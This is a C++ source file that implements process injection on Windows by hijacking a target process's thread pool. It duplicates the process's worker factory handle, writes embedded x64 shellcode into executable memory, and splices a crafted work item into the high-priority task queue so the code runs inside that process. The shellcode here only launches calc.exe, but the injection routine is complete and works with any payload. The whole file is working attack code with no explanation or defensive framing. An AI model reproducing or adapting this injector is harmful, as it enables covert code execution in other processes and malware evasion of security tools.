#include <Windows.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#include "ThreadPool.h"
#include "WorkerFactory.h"
#include "Native.h"

#pragma comment(lib, "ntdll")

template<typename TStruct>
std::unique_ptr<TStruct> w_ReadProcessMemory(HANDLE hTargetPid, LPVOID BaseAddress)
{
	auto Buffer = std::make_unique<TStruct>();
	auto BufferSize = sizeof(TStruct);
	SIZE_T szNumberOfBytesRead;

	ReadProcessMemory(
		hTargetPid,
		BaseAddress,
		Buffer.get(),
		BufferSize,
		&szNumberOfBytesRead);

	if (BufferSize != szNumberOfBytesRead) {
		std::printf("WARNING: Read %d bytes instead of %d bytes\n", szNumberOfBytesRead, BufferSize);
	}

	return Buffer;
}


EXTERN_C
NTSTATUS NTAPI NtQueryInformationWorkerFactory(
	_In_ HANDLE WorkerFactoryHandle,
	_In_ QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
	_In_ ULONG WorkerFactoryInformationLength,
	_Out_opt_ PULONG ReturnLength
);

EXTERN_C
NTSTATUS NTAPI NtSetInformationWorkerFactory(
	_In_ HANDLE WorkerFactoryHandle,
	_In_ SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
	_In_ ULONG WorkerFactoryInformationLength
);

unsigned char g_Shellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";

int main(int argc, char* argv[])
{
	// 01 - retrieve a handle to the target process

	HANDLE hTargetProcess = nullptr;
	HANDLE hTpWorkFactory = nullptr;
	DWORD TargetPID = 0;

	TargetPID = atoi(argv[1]);
	//TargetPID = 1111 ;

	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		printf("[-] OpenProcess failed: 0x%08X\n", GetLastError());
		return 1;
	}

	printf("[+] Opened a remote handle to the target process %d: 0x%p\n", TargetPID, hTargetProcess);


	// 02 - duplicate worker factory handle

	ULONG InformationLength = 0;
	auto status = 0x0; 
	std::vector<BYTE> Information;

	do {
		Information.resize(InformationLength);
		status = NtQueryInformationProcess(hTargetProcess, (PROCESSINFOCLASS)51, Information.data(), InformationLength, &InformationLength);
	} while (status == 0xffffffffc0000004);

	if (status != 0x0) {
		printf("[-] NtQueryInformationProcess failed.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	const auto pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information.data());

	HANDLE hDuplicatedObject = INVALID_HANDLE_VALUE;
	std::vector<BYTE> pObjectInformation;
	PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

	for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {

		BOOL bResult = DuplicateHandle(hTargetProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObject, WORKER_FACTORY_ALL_ACCESS, FALSE, NULL);

		if (bResult == 0x0) {
			printf("[-] DuplicateHandle failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		ULONG InformationLen = 0;
		do {

			pObjectInformation.resize(InformationLen);
			status = NtQueryObject(hDuplicatedObject, (OBJECT_INFORMATION_CLASS)2, pObjectInformation.data(), InformationLen, &InformationLen);

		} while (status == 0xffffffffc0000004);

		if (status != 0x0) {
			printf("[-] NtQueryObject failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

		printf("\t\t%ls - 0x%p\n", (wchar_t*)pObjectTypeInformation->TypeName.Buffer, hDuplicatedObject);

		if (wcscmp(L"TpWorkerFactory", pObjectTypeInformation->TypeName.Buffer) == 0) {
			printf("[+] Duplicated a TpWorkerFactory handle: 0x%p\n", hDuplicatedObject);
			break;
		}

		continue;
	}

	if (hDuplicatedObject == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to duplicate TpWorkerFactory handle.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	// 03 - Allocate shellcode memory in the targer process

	PVOID ShellCodeAddress = nullptr;
	ShellCodeAddress = VirtualAllocEx(hTargetProcess, nullptr, sizeof(g_Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ShellCodeAddress == nullptr) {
		printf("[-] VritualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Allocated shellcode memory to the target process: 0x%p\n", ShellCodeAddress);

	// 04 - Write shellcode in the targer process

	BOOL bResult = WriteProcessMemory(hTargetProcess, ShellCodeAddress, g_Shellcode, sizeof(g_Shellcode), nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Written shellcode to the target process.\n");

	// 05 - retrieve target worker factory basic information

	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };

	status = NtQueryInformationWorkerFactory(hDuplicatedObject, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), nullptr);
	if (status != 0x0) {
		printf("[-] NtQueryInformationWorkerFactory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	// 06 - read target process's TP_POOL structure into the current process

	const auto TargetTpPool = w_ReadProcessMemory<FULL_TP_POOL>(hTargetProcess, WorkerFactoryInformation.StartParameter);

	/*
	SIZE_T szNumberOfBytesRead;
	PFULL_TP_POOL TargetTpPool = (PFULL_TP_POOL)malloc(sizeof(FULL_TP_POOL));

	if (TargetTpPool != 0 && WorkerFactoryInformation.StartParameter != 0) 
	{
		bResult = ReadProcessMemory(hTargetProcess, WorkerFactoryInformation.StartParameter, TargetTpPool, sizeof(FULL_TP_POOL), &szNumberOfBytesRead);
	}

	if (bResult == 0x0) {
		printf("[-] ReadProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}
	*/

	// 07 - create TP_WORK structure associated with the shellcode

	const auto TargetTaskQueueHighPriorityList = &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	const auto pTpWork = (PFULL_TP_WORK)CreateThreadpoolWork((PTP_WORK_CALLBACK)ShellCodeAddress, nullptr, nullptr);
	if (pTpWork == NULL) {
		printf("[-] CreateThreadpoolWork failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	// 08 - Modify the TP_WORK structure to be associated with target process's TP_POOL

	pTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
	pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
	pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
	pTpWork->WorkState.Exchange = 0x2;

	// 09 - Allocate TP_WORK memory in the targer process

	PFULL_TP_WORK pRemoteTpWork = (PFULL_TP_WORK)VirtualAllocEx(hTargetProcess, nullptr, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteTpWork == nullptr) {
		printf("[-] VirtualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Allocated TP_WORK memory in the targer process: 0x%p\n", pRemoteTpWork);

	// 10 - Write the crafted TP_WORK structure to the targer process
	bResult = WriteProcessMemory(hTargetProcess, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Written the crafted TP_WORK structure to the targer process\n");

	// 11 - Modify the target process's TP_POOL task queue list entry to point to the crafted TP_WORK
	auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;

	bResult = WriteProcessMemory(hTargetProcess, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), nullptr);
	bResult = WriteProcessMemory(hTargetProcess, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), nullptr);



	return 0;
}
